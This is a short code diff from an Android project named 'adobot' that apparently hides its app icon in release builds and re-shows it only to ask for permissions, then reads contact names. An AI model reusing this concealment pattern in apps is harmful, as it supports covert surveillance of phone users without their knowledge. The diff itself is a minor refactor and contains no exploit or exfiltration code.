@@ -13,7 +13,7 @@ import android.support.v4.content.ContextCompat;
 
 import com.android.adobot.BuildConfig;
 import com.android.adobot.CommonParams;
-import com.android.adobot.activities.MainActivity;
+import com.android.adobot.activities.AskPermissionsActivity;
 
 import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 
@@ -33,13 +33,13 @@ public class BaseTask extends Thread implements Runnable {
 
     protected void showAppIcon() {
         PackageManager p = context.getPackageManager();
-        ComponentName componentName = new ComponentName(context, MainActivity.class);
+        ComponentName componentName = new ComponentName(context, AskPermissionsActivity.class);
         p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
     }
 
-    public String getContactName(Context context, String phoneNumber) {
+    public String getContactName(String phoneNumber) {
         // check permission
-        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(context.getApplicationContext(), Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
             ContentResolver cr = context.getContentResolver();
             Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
             Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
@@ -64,7 +64,7 @@ public class BaseTask extends Thread implements Runnable {
     protected void requestPermissions() {
         // app icon already shown in debug
         if (!BuildConfig.DEBUG) showAppIcon();
-        Intent i = new Intent(context, MainActivity.class);
+        Intent i = new Intent(context, AskPermissionsActivity.class);
         i.addFlags(FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(i);
     }
